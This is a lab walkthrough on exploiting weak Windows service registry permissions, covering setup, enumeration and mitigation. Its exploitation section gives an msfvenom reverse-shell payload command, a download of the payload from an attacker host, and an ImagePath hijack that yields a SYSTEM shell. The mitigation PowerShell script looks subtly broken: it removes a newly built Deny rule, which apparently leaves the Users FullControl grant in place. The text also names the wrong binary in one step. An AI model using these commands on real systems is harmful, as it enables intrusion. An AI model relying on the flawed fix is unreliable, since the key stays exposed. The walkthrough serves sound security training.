# Weak Registry Permissions

## Table of Contents

- [Weak Registry Permissions](#weak-registry-permissions)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
    - [Manual Enumeration](#manual-enumeration)
    - [Tool Enumeration](#tool-enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

Weak registry permissions represent a vulnerability within the Windows registry resulting from misconfigured access controls. This issue involves specific registry keys or entries having permissions that permit unauthorized users to manipulate or access crucial system configurations. This vulnerability can be exploited by attackers who inject malicious code into registry keys, thus obtaining unauthorized privileged access.

## Lab Setup

### Manual Lab Setup

1) Open a PowerShell with local Administrtor Privileges and use the following command to create a new folder:

```
mkdir "C:\Program Files\CustomSrv4\"
```

2) Download the file [Service4.exe](/Lab-Setup-Binary/Service4.exe) to the 'C:\Program Files\CustomSrv4' directory.

3) Install the new Service:

```
New-Service -Name "Vulnerable Service 4" -BinaryPathName "C:\Program Files\CustomSrv4\Service4.exe" -DisplayName "Vuln Service 4" -Description "My Custom Vulnerable Service 4" -StartupType Automatic
```

4) Edit new service's permissions to be controlled by BUILTIN\Users:

```
cmd.exe /c 'sc sdset "Vulnerable Service 4" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;BU)'
```

Outcome:

![Weak-Registry-Permissions-Manual-Lab-Setup](/Pictures/Weak-Registry-Permissions-Manual-Lab-Setup.png)

5) Open Registry panel with `regedit` command and navigate to 'Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4':

![Weak-Registry-Permissions-Manual-Lab-Setup-2](/Pictures/Weak-Registry-Permissions-Manual-Lab-Setup-2.png)

6) Right click on "Vulnerable Service 4" and choose the "permissions" option:

![Weak-Registry-Permissions-Manual-Lab-Setup-3](/Pictures/Weak-Registry-Permissions-Manual-Lab-Setup-3.png)

7) Allow Full Access control on Users and then press "OK" button:

![Weak-Registry-Permissions-Manual-Lab-Setup-4](/Pictures/Weak-Registry-Permissions-Manual-Lab-Setup-4.png)

### PowerShell Script Lab Setup

To set up the lab with the 'Weak Registry Permissions' vulnerability is by using the custom PowerShell script named [WeakRegistryPermissions.ps1](/Lab-Setup-Scripts/WeakRegistryPermissions.ps1).

1) Open a PowerShelll with local Administrator privileges and run the script:

```
.\WeakRegistryPermissions.ps1
```

Outcome:

![Weak-Registry-Permissions-Script-Lab-Setup](/Pictures/Weak-Registry-Permissions-Script-Lab-Setup-4.png)

## Enumeration

### Manual Enumeration

To perform manual enumeration of the `Weak Registry Permissions` vulnerability, you can use the following steps:

1) Open a Powershell and use the following command to enumerate registry permissions:

```
Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4" | fl
```

2) Use the following command to identify the image path of the service:

```
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4"
```

Outcome:

![Weak-Registry-Permissions-Manual-Enumeration](/Pictures/Weak-Registry-Permissions-Manual-Enumeration.png)

### Tool Enumeration

To run the SharpUp tool and perform an enumeration of the `Weak Registry Permissions` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit ModifiableServiceRegistryKeys
```

Outcome:

![Weak-Registry-Permissions-Tool-Enumeration](/Pictures/Weak-Registry-Permissions-Tool-Enumeration.png)

## Exploitation

To abuse this vulnerability you should follow these steps:

1) Create with msfvenom a malicious exe file:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service4.exe
```

2) Open a listener in your kali machine.

3) Transfer and overwrite the Service2.exe file with the malicious binary:

```
iwr -Uri http://<ip>:<port>/Service4.exe -Outfile C:\Windows\Tasks\Service4.exe
```

4) Change the image path for service:

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\Tasks\Service4.exe" /f
```

5) Start the service with the following command or reboot the machine:

```
sc start "Vulnerable Service 4"
```

Outcome:

![Weak-Registry-Permissions-Exploitation](/Pictures/Weak-Registry-Permissions-Exploitation-2.png)

6) Verify the reverse shell on your Kali machine:

![Weak-Registry-Permissions-Reverse-Shell](/Pictures/Weak-Registry-Permissions-Reverse-Shell.png)

## Mitigation

To defend against Weak Regisrty Permissions vulnerabilities, adjust permissions on Regisrty hives initiated through this mechanism. This limits unauthorized access and strengthens security measures:

1) Open Registry panel with `regedit` command and navigate to 'Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4'.

2) Right click on "Vulnerable Service 4" and choose the "permissions" option.

3) Remove the checkmark from the 'Full Control' box assigned to 'Users,' then click the 'OK' button.

However, you can use the following PowerShell script:

```
# Define the registry key path
$regKey = "HKLM:\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4"

# Get the current ACL (Access Control List) for the registry key
$acl = Get-Acl -Path $regKey

# Specify the account and access rights to be removed
$account = "BUILTIN\Users"
$accessRights = [System.Security.AccessControl.RegistryRights]::FullControl

# Create a new access rule to remove FullControl
$accessRule = New-Object System.Security.AccessControl.RegistryAccessRule($account, $accessRights, "Deny")

# Remove the access rule from the ACL
$acl.RemoveAccessRule($accessRule)

# Set the modified ACL back to the registry key
Set-Acl -Path $regKey -AclObject $acl
```

## References

- [Windows registry information for advanced users Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users)
- [About Registry Microsoft](https://learn.microsoft.com/en-us/windows/win32/sysinfo/about-the-registry)
- [Registry Key Security and Access Rights Microsoft](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)